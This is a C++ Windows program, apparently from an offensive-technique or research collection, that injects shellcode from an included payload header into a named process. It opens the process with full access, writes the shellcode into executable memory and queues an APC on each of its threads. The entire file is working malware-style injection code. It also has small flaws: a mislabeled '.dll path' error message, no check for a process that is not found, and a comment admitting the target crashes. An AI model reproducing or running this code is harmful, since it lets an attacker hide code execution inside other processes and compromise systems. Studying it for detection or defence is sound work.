#include <Windows.h>
#include <cstdio>
#include <tlhelp32.h>
#include <vector>

#include "../payload/shellcode.hpp"


/**
* Injects shellcode into every thread of a process using QueueAPC.
* The current implementation causes the process crash after executing the shellcode since the shellcode does not comply the PAPCFUNC prototype expected by QueueUserApc.
*/
int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	const char* processName = argv[1];

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("Error %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("Error %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("Error %d - Failed to aquire process handle\n", GetLastError());
		return 1;
	}

	// allocate memory in target process
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("Error %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	// write shellcode into target process
	if (!WriteProcessMemory(targetProcessHandle, remoteMemory, shellcode, sizeof(shellcode), NULL))
	{
		printf("Error %d - Failed to write .dll path to target process\n", GetLastError());
		return 1;
	}

	// get first thread of snapshot
	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
	if (!Thread32First(processesSnapshot, &currentThreadEntry))
	{
		printf("Error %d - Failed to Thread32First\n", GetLastError());
		return 1;
	}

	// iterate over target processes threads and inject APC into each of them
	// this increases the chance of the shellcode being executed since only one of the thread needs to reach an alertable state
	do
	{
		if (currentThreadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
		{
			HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, currentThreadEntry.th32ThreadID);
			if (!threadHandle)
			{
				printf("Warning - Failed to acquire thread handle with error %d\n", GetLastError());
				continue;
			}
			QueueUserAPC((PAPCFUNC)remoteMemory, threadHandle, NULL);
			CloseHandle(threadHandle);
		}
	} while (Thread32Next(processesSnapshot, &currentThreadEntry));

	return 0;
}